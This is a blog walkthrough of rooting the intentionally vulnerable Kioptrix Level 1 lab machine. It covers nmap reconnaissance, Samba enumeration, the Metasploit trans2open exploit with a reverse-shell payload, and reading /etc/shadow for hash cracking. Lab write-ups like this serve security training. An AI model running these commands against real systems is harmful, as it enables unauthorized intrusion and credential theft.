<!DOCTYPE html>
<html lang="en-us">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width">
    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
    <title>Kioptrix Level 1 Walkthrough - Peter Wambua&#39;s blog</title>
    
    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
    
    <meta name="theme-color" content="#1e2327">

    
    <meta name="description"
  content="Kioptrix is usually the starting point of all penetration testers, the first box we pawn. Here is a walkthrough of how I rooted my kioptrix box." />
<meta name="keywords"
  content='' />
<meta name="robots" content="noodp" />
<link rel="canonical" href="http://localhost:1313/post/kioptrix/" />


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Kioptrix Level 1 Walkthrough - Peter Wambua&#39;s blog" />
<meta name="twitter:description"
  content="Kioptrix is usually the starting point of all penetration testers, the first box we pawn. Here is a walkthrough of how I rooted my kioptrix box." />
<meta name="twitter:site" content="http://localhost:1313/" />
<meta name="twitter:creator" content="" />
<meta name="twitter:image"
  content="http://localhost:1313/">


<meta property="og:type" content="article" />
<meta property="og:title" content="Kioptrix Level 1 Walkthrough - Peter Wambua&#39;s blog">
<meta property="og:description"
  content="Kioptrix is usually the starting point of all penetration testers, the first box we pawn. Here is a walkthrough of how I rooted my kioptrix box." />
<meta property="og:url" content="http://localhost:1313/post/kioptrix/" />
<meta property="og:site_name" content="Kioptrix Level 1 Walkthrough" />
<meta property="og:image"
  content="http://localhost:1313/">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta property="article:published_time" content="2022-10-20 03:21:26 -0400 EDT" />











</head>

<body>
  <div style="position: relative">
  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
      <a class="Header-link" href="http://localhost:1313/">
        <img class="octicon" height="32" width="32" src="">
      </a>
    </div>
    <div class="Header-item d-md-none">
      <button class="Header-link btn-link js-details-target" type="button"
        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
        <img height="24" class="octicon octicon-three-bars" width="24" src="">
      </button>
    </div>
    <div style="display: none;" id="header-search"
      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
      <div
        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
        <div class="position-relative">
          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
            autocomplete="off">
            <label
              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
              <input type="text"
                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
                name="q" value="" placeholder="Search" autocomplete="off">
              <input type="hidden" name="q" value="site:http://localhost:1313/">
            </label>
          </form>
        </div>
      </div>
    </div>

    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
      <a class="Header-link " href="http://localhost:1313/">
        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
      </a>
    </div>
    <div class="Header-item" style="margin-right: 0;">
      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
          version="1.1" width="16" height="16">
          <path fill-rule="evenodd" clip-rule="evenodd"
            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
          </path>
        </svg>
      </a>
    </div>
  </header>
</div>

  
<div>
  <main>
    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
      <div class="px-0">
        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
          <div class="flex-auto min-width-0 width-fit mr-3">
            <div class="d-flex">
              <div class="d-none d-md-block">
                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
                  <img class=" avatar-user"
                    src="/images/profile.png"
                    width="32" height="32"></a>
              </div>
              <div class="d-flex flex-column">
                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
                  <span class="author">
                    <a href="http://localhost:1313/">Peter Wambua</a>
                  </span>
                  <span class="path-divider">/</span>
                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
                    <a href="http://localhost:1313/post/kioptrix/">Kioptrix Level 1 Walkthrough</a>
                  </strong>
                </h1>
                <div class="note m-0">
                  Created <relative-time datetime="Thu, 20 Oct 2022 03:21:26 -0400"
                    class="no-wrap">
                    Thu, 20 Oct 2022 03:21:26 -0400</relative-time>

                  
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <div class="container-lg px-3 new-discussion-timeline">
      <div class="repository-content gist-content">
        <div>
          <div class="js-gist-file-update-container js-task-list-container file-box">
            <div id="file-pytest" class="file my-2">
              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
                    
                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
                      </svg>
                    </summary>
                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
                        </div>
                      </div>
                    </details-menu>
                      741 Words
                    

                  </div>
                  <div class="file-actions flex-order-2 pt-0">
                    
                  </div>
                </div>
              </div>


              <div class="Box-body px-5 pb-5" style="z-index: 1">
                <article class="markdown-body entry-content container-lg"><h1 id="pawn-kioptrix-level-1">PAWN KIOPTRIX LEVEL 1</h1>
<blockquote>
<p>Tools: Nmap, SearchSploit, MetaSploit, Google
<img src="/images/kioptrix/kioptrix.webp" alt=""></p>
</blockquote>
<p>You can download kioptrix from <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">vulnhub</a>. I will not cover setting up Kioptrix on a virtualbox but it is a simple process you can get tutorials or writes-ups.</p>
<p>Once you have kioptrix and your attacker machine(We will use Kali linux) ready, we are ready to hack the h*ll out of kioptrix.
We need to know the ip address of kioptrix. To do this, we will have to scan from our attacker machine. Check your ip adress of Kali by:</p>
<blockquote>
<p>ifconfig</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix1.webp" alt=""></p>
<p>On my case, my kali linux ip is 192.168.100.200</p>
<p>Now, we will scan all other machines running on the same network as kali linux by using nmap and -r for range of /24:</p>
<blockquote>
<p>nmap -r 192.168.100.200/24</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix2.webp" alt=""></p>
<p>Observe carefully and you will discover a machine running on oracle virtualbox. That is our kioptrix machine. Mine is running on 192.168.100.201</p>
<p>Now that we have our ip address, we will need to collect as much information as we can about the services running on it to discover if some may have vulnerabilities. We will conduct an inclusive recon using nmap and the -A option, -p- to scan all ports that are up and -T4 which is a time factor I consider most efficient:</p>
<blockquote>
<p>sudo nmap -A -p- -T4 192.168.100.201</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix3.webp" alt=""></p>
<p>Interesting, right???
We observe tcp running on 22, http on port 80, smbd on port 139, and many more services. Usually, I love to check what the http looks like so I navigated to http://192.168.100.201:80</p>
<p><img src="/images/kioptrix/kioptrix4.webp" alt=""></p>
<p>We notice it is running apache. It provides more information that it is running on red hat linux. You can navigate to a non-existing page here like /whoareyou. Of course, it gives you an error that page not found, but will tell you what apache it is running on and you can research on vulnerabilities for such. Mine as observed from both the scan and http page, is running apache 1.3.20</p>
<p><img src="/images/kioptrix/kioptrix5.webp" alt=""></p>
<p>My interest though was on the service running on port 139, the samba smbd. I researched about it and discovered it is a server daemon that provides filesharing and printing services to clients.
Not much information was provided about it from the scan. I needed to know what version it was running and find out if it could have some vulnerabilities.
I found out that I could use metasploit to enumerate the service. Niceee!!!
Fire up metasploit from the terminal by:</p>
<blockquote>
<p>msfconsole</p>
</blockquote>
<p>We can search the module to enumerate by:</p>
<blockquote>
<p>search smb_version</p>
</blockquote>
<p>We’ll get a module auxiliary/scanner/smb/smb_version. We can use it by:</p>
<blockquote>
<p>use auxiliary/scanner/smb/smb_version</p>
</blockquote>
<p>Or by simply</p>
<blockquote>
<p>use 0</p>
</blockquote>
<p>We type options and set the rhosts to the ip of kioptrix by:</p>
<blockquote>
<p>set rhosts 192.168.100.201</p>
</blockquote>
<p>Now hit the command run or exploit</p>
<p><img src="/images/kioptrix/kioptrix6.webp" alt=""></p>
<p>We discover that kioptrix is running version 2.2.1a.<br>
From numerous research, I found out that Samba 2.2 is vulnerable. We can use a certain tool, searchsploit to find some of the vulnerabilities by the command:</p>
<blockquote>
<p>searchsploit samba 2.2</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix7.webp" alt=""></p>
<p>We notice the word trans2open in almost every exploit. Must be something interesting about it right? Let’s find out<br>
In metasploit, do:</p>
<blockquote>
<p>search trans2open</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix8.webp" alt=""></p>
<p>Different modules are displayed. Though, through our enumeration, we are aware we are running linux so we use 1.
Check options and set rhosts to your kioptrix ip address.
Now hit exploit.</p>
<p>We notice that it runs with no success. This is because we have not set a the correct payload. Hit ctrl+c</p>
<p>By some research, we discover a great payload for getting a reverse shell(of course this is our goal). Use:</p>
<blockquote>
<p>search x86/shell_reverse_tcp</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix9.webp" alt=""></p>
<p>We get some few options to use. I always love a staged payload for some reasons, hence I tried some of these and settled on the third.<br>
I then set it by the following command:</p>
<blockquote>
<p>set payload payload/bsdi/x86/shell_reverse_tcp</p>
</blockquote>
<p>Now I hit exploit:</p>
<p><img src="/images/kioptrix/kioptrix10.webp" alt=""></p>
<p>A reverse shell gets generated!!<br>
Running whoami on the shell, it confirms we are root user hence we can do all kinds of stuff here.<br>
I love checking users on the machine by checking the /etc/passwd file:</p>
<blockquote>
<p>cat /etc/passwd</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix11.webp" alt=""></p>
<p>Though, this only has users. Passwords of these users are stored on /etc/shadow file</p>
<blockquote>
<p>cat /etc/shadow</p>
</blockquote>
<p><img src="/images/kioptrix/kioptrix12.webp" alt=""></p>
<p>You have the password hashes and what remains is to go crack these passwords using tools like hashcat. There are much more things you can do at this stage since you are already a root user(you own the box by now). Check the flag at <em>/home/root</em> if it is a CTF</p>
<p>Fun, ain’t it :)</p>
</article>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </main>
</div>
<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />



  <div class="footer container-xl width-full p-responsive">
  <div
    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
        <path fill-rule="evenodd"
          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
        </path>
      </svg>
    </a>
    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
      <li class="mr-3 mr-lg-0">Contact me on <a href='https://www.linkedin.com/in/peter-wambua/'>LinkedIn</a></li>
    </ul>
  </div>
  <div class="d-flex flex-justify-center pb-6">
    <span class="f6 text-gray-light"></span>
  </div>


</div>
</body>

<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>




</html>